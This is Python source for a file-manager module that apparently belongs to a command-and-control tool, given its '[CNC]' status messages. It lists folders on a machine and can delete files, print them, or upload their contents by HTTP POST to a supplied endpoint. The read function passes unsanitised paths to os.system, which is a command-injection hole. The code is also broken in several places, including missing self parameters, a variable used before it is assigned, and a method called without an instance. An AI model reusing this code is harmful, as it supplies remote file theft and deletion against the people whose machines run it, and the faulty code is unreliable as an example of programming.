import os
import tkinter.filedialog as fd
import requests
import os.path as path
from pprint import pprint
import colorama 
import platform
from tabulate import tabulate
from colorama import Fore,Style
colorama.init()


def writetofile(error:str):
        with open("erors.txt",'a',encoding='utf-8',errors='ignore')as e:
            e.write(str(error)+"\n")



class FileDialog:
    def __init__(self):
        self.commands =[["[file] --remove","deletes the selected file"],["[file] --read","prints the contents of the file"],["[file] --upload",'uploads the selected file to your machine']]


    def removefile(self,filepath):
        try:
                os.remove(filepath)
                print(Fore.GREEN+f"[CNC]:removed file {filepath} successfully")
        except Exception as e:
            writetofile(e)

    def uploadfile(self,filepath,ENDPOINT):
        try:
            with open(filepath,"rb",errors="ignore") as b:
                data = {
                    "BYTES":b.read()
                }
                r = requests.post(ENDPOINT,data=data)
                if r.status_code == 200:
                    print(Fore.GREEN+f"[CNC]:file {filepath} Is being uploaded or uploaded")
        except Exception as e:
            writetofile(e)

    def readfile(filepath):
        try:
            if platform.system() == "Linux":
                 #SHOULD BE REPLACED WITH THE SOCKETS CODE
                pprint(os.system(f"cat {filepath}"))
            elif platform.system() == "Windows":
                #SHOULD BE REPLACED WITH THE SOCKETS CODE
                pprint(os.system(f"type {filepath}"))
        except Exception as e:
            writetofile(e)

    def dostufftofile(self,filepath,cmd,endpoint=None):
        if cmd == "remove":
            self.removefile(filepath=filepath)


        elif cmd == "upload" and endpoint != None:
            self.uploadfile(filepath=filepath,ENDPOINT=endpoint)

        elif cmd == "read":
            self.readfile(filepath)
            


    

    def searchfiles(self,folder_path):
        try:
            Files = {}
            data = []
            for file_or_folder in os.listdir(folder_path):
                floder =path.join(folder_path ,file_or_folder)
                file_type = "File" if os.path.isfile(floder) else "Folder"
                if file_type == "File":
                    Files[file_or_folder] = "File"
                    data.append([Fore.RED +file_or_folder+ Style.RESET_ALL, Fore.RED + file_type + Style.RESET_ALL])        
                else:
                    Files[file_or_folder] = "Folder "
                    data.append([Fore.BLUE + floder + Style.RESET_ALL, Fore.BLUE + file_type + Style.RESET_ALL])        

            table = tabulate(data, headers=["Name", "Type"], tablefmt="fancy_grid")
            print(table)

            inp = input(f"\n\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Filemanager: ")
            try:
                cmd = inp.split("--")[1]
            except:
                print("You have to add a Command")
                if cmd != "upload":
                    filename = inp.split("--")[0].strip(" ")
                    floder =path.join(folder_path ,filename)
                    dostufftofile(cmd=cmd,filepath=floder)
            except Exception as e:
                writetofile(e)
        

        except Exception as e:
            writetofile(e)                
                    

#print(fd.askdirectory())




    

searchfiles('/home/iq/Desktop/code/Siteophile')